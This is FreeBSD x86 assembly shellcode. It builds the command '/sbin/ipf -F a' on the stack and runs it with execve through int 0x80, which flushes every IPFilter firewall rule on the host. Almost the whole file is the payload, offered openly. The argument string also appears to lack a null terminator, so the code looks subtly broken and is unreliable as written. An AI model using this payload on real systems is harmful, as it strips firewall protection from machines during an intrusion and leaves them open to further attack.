/* CD80-fBSD-ipf.s
 * * * * * * * * * * * * * * * * * * * * *
 * nirosys at 0xcd80 dot org
 * * * * * * * * * * * * * * * * * * * * *
 * execve("/sbin/ipf", { "/sbin/ipf", "-F a" }, NULL );
 * * * * * * * * * * * * * * * * * * * * */
.data
.NAME:
	.ascii "CD80-fBSD-ipf.s"

.text
.global _start

_start:
	xorl	%eax, %eax   
	mov	$0x66, %al
	pushl	%eax	      /* Pushes "f"    */
	pushl	$0x70692f6e   /* Pushes "n/ip" */
	pushl	$0x6962732f   /* Pushes "/sbi" */
	movl	%esp, %ebx    /* Safe ptr to "/sbin/ip" */
	pushl	$0x6120462d   /* Pushes "-F a"          */
	movl	%esp, %ecx    /* Save ptr to "-F a"     */
	xorl	%edx, %edx
	pushl	%edx	      /* arg[2]: NULL        */
	pushl	%ecx	      /* arg[1]: "-F a"      */
	pushl	%ebx	      /* arg[0]: "/sbin/ipf" */
 	movl	%esp, %ecx    /* Save argp */
	pushl	%edx	      /* BSD param passing...*/
	pushl	%ecx
	pushl	%ebx
	pushl	%eax	      /* BSD return addie.. */
	mov	$0x3b, %al    /* execve */
	int	$0x80         /* 0xCD80!!!!! */	
